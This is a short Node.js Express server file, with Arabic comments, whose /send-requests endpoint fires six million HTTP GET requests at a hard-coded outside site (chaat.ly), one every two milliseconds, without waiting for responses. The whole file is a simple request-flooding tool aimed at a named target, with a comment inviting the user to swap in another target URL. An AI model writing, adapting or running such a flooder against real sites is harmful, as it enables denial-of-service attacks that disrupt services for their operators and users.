const express = require("express");
const fetch = require("node-fetch"); // تأكد من تثبيت الحزمة node-fetch

const app = express();
const port = 3000;

// الدالة لإرسال الطلبات
const sendRequests = async (url, times, interval) => {
  for (let i = 0; i < times; i++) {
    fetch(url)
      .then((response) => {
        console.log(`Request ${i + 1}:`, response.status);
      })
      .catch((error) => {
        console.error(`Request ${i + 1} failed:`, error.message);
      });

    // الانتظار بين الطلبات
    await new Promise((resolve) => setTimeout(resolve, interval));
  }
};

// نقطة النهاية تعمل تلقائيًا عند زيارة الرابط
app.get("/send-requests", async (req, res) => {
  const targetUrl =
    "http://chaat.ly/"; // استبدلها بالرابط الهدف
  const totalRequests = 6000000; // عدد الطلبات
  const requestInterval = 2; // الفاصل الزمني بين الطلبات (بالملي ثانية)

  try {
    console.log(`Starting requests to ${targetUrl}`);
    sendRequests(targetUrl, totalRequests, requestInterval); // تنفيذ الطلبات
    res.status(200).send(`Requests to ${targetUrl} started successfully!`);
  } catch (error) {
    console.error("Error in sending requests:", error.message);
    res.status(500).send("Error in sending requests.");
  }
});

// بدء الخادم
app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});
